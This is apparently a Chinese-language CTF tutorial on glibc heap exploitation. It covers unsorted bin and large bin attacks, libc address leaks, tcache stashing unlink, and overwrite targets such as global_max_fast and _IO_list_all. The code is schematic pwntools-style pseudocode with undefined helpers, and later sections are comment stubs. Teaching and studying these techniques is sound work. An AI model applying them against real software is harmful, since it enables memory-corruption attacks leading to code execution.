# Unsorted Bin 攻击

## 原理

glibc 的 unsorted bin 是一个临时存放 free chunk 的双向链表。攻击者通过 UAF 修改 unsorted bin 中 chunk 的 fd/bk 指针，实现任意地址写或信息泄露。

## Unsorted Bin 特点

- 双向链表（fd/bk）
- FIFO（先进先出）
- chunk 大小任意
- 链表头在 main_arena 中
- free 的 chunk 先进入 unsorted bin（非 fastbin/tcache 大小）

## 攻击链

### 1. 泄露 libc 地址

```python
from pwn import *

p = process('./pwn')

# 1. 分配大 chunk（大于 tcache）
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1，防止合并
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. UAF 读取 fd/bk
fd = u64(read(0, 8))
bk = u64(read(0, 8, offset=8))
# fd/bk 指向 main_arena + 96（64位）
libc_base = fd - (libc.symbols['main_arena'] + 96)
```

### 2. Unsorted Bin Attack（任意地址写大值）

```python
# 1. 分配大 chunk
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1
# 2. 释放 idx 0
free(0)
# 3. UAF 修改 bk
edit(0, p64(0) + p64(target_addr - 0x10))
# 4. 分配触发
malloc(0x400)
# target_addr 处被写入 main_arena 地址（一个很大的值）
```

### 3. Large Bin Attack

```python
# 1. 分配大 chunk
malloc(0x420)  # idx 0
malloc(0x20)   # idx 1
malloc(0x410)  # idx 2
malloc(0x20)   # idx 3
# 2. 释放 idx 0
free(0)
# 3. 分配大 chunk，触发 idx 0 进入 largebin
malloc(0x430)  # idx 4
# 4. 释放 idx 2
free(2)
# 5. UAF 修改 idx 0 的 fd_nextsize/bk_nextsize
edit(0, p64(0) + p64(0) + p64(0) + p64(target_addr - 0x20))
# 6. 分配触发
malloc(0x430)
# target_addr 处被写入堆地址
```

### 4. Unsorted Bin -> Smallbin

```python
# 当 unsorted bin 中的 chunk 被请求时
# 如果大小不匹配，会被放入对应的 smallbin/largebin
# 利用这个机制可以实现 tcache stashing unlink attack
```

### 5. Tcache Stashing Unlink Attack

```python
# 利用 tcache 和 smallbin 的交互
# 当 smallbin 中的 chunk 被分配时，剩余 chunk 会被放入 tcache

# 1. 填满 tcache
for i in range(7):
    malloc(0x90)  # idx 0-6
malloc(0x90)  # idx 7
malloc(0x20)  # idx 8，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 unsorted bin
free(7)
# 4. 分配大 chunk，触发 idx 7 进入 smallbin
malloc(0x100)  # idx 9
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x90)
# 6. 修改 smallbin 中 chunk 的 bk
edit(7, p64(0) + p64(target_addr - 0x10))
# 7. 分配 0x90，触发 tcache stashing unlink
# target_addr 处的 chunk 被放入 tcache
malloc(0x90)
```

## 利用场景

### 1. 覆盖 global_max_fast

```python
# unsorted bin attack 覆盖 global_max_fast
# 让大 chunk 也进入 fastbin
target = libc.symbols['global_max_fast']
# unsorted bin attack
# target 处被写入 main_arena 地址（很大值）
# 之后 free 大 chunk 也会进入 fastbin
```

### 2. 覆盖 _IO_list_all

```python
# unsorted bin attack 覆盖 _IO_list_all
# 实现 IO_FILE 攻击（House of Orange）
target = libc.symbols['_IO_list_all']
# unsorted bin attack
# target 处被写入 main_arena 地址
# 然后构造 fake IO_FILE
```

### 3. 覆盖 __exit_funcs

```python
# glibc 2.34+
# 覆盖 __exit_funcs 实现 RCE
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 加固

```python
# unsorted bin attack 的 size 检查加强
# bk->fd == chunk 检查
# 需要绕过
```

### 2. House of Apple 系列

```python
# House of Apple 2/3
# 针对 glibc 2.34+
# 通过 unsorted bin + IO_FILE 实现 RCE
```

### 3. House of Cat

```python
# 2024 年新利用链
# 针对 glibc 2.35+
# 通过 largebin + IO_FILE 实现 RCE
```

### 4. Largebin Attack 新变种

```python
# glibc 2.34+
# largebin attack 的检查加强
# 需要新绕过方法
```

### 5. 硬件级防护

```python
# Intel CET
# ARM PAC/BTI
# MTE (Memory Tagging Extension)
# 影响 unsorted bin 利用
```

### 6. 沙箱环境

```python
# seccomp 限制
# 通过 ORW (open/read/write) 绕过
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（unsortedbin 命令）
- **heap-viewer** — 堆可视化

## 参考链接

- [ctf-wiki unsorted bin](https://ctf-wiki.org/pwn/linux/glibc-heap/unsorted_bin_attack/)
- [how2heap unsorted bin](https://github.com/shellphish/how2heap)
- [Unsorted Bin Attack](https://www.jianshu.com/p/4d7d7a460c0c)
